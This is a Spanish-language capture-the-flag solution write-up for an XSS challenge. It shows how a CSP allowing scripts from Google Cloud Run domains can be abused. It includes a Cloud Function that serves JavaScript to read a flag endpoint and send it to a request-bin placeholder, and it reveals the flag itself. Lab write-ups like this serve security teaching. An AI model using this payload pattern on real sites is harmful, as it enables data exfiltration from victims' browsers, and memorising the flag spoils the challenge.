La cabecera Content-Security-Policy (CSP) permite cargar archivos JavaScript externos desde `*.us-central1.run.app`:
`` default-src 'self'; 
   script-src 'self' '*.us-central1.run.app';
   connect-src *; 
   style-src-elem 'self' fonts.googleapis.com fonts.gstatic.com; 
   font-src 'self' fonts.gstatic.com fonts.googleapis.com ``

Este es el dominio utilizado por Google Cloud Run y Cloud Functions, por lo que se puede desplegar una función que devuelva el código JavaScript encargado de leer `/xss-two-flag` y exfiltrar la flag (`DUOC{dominio_autorizado_politica_85329}`):
``` 
def serveIt(request):
   
    request_json = request.get_json(silent=True)
    request_args = request.args

    if request_json and 'name' in request_json:
        name = request_json['name']
    elif request_args and 'name' in request_args:
        name = request_args['name']
    else:
        name = 'World'

    return """  
            var xhr = new XMLHttpRequest();
            xhr.open('GET',location.origin + '/xss-two-flag',true);
            xhr.onload = function () {
                var request = new XMLHttpRequest();
                request.open('GET','<REQUEST_BIN_URL>?flag=' + xhr.responseText,true);
                request.send()};
            xhr.send(null);
    """ 
 ```

 Puedes utilizar el script prealojado `<script src="https://javascript-server-808630243113.us-central1.run.app"> </script>` para probar el desafío.

 O ejecutar la solución automatizada: `python3 solution.py <challenge-url>`.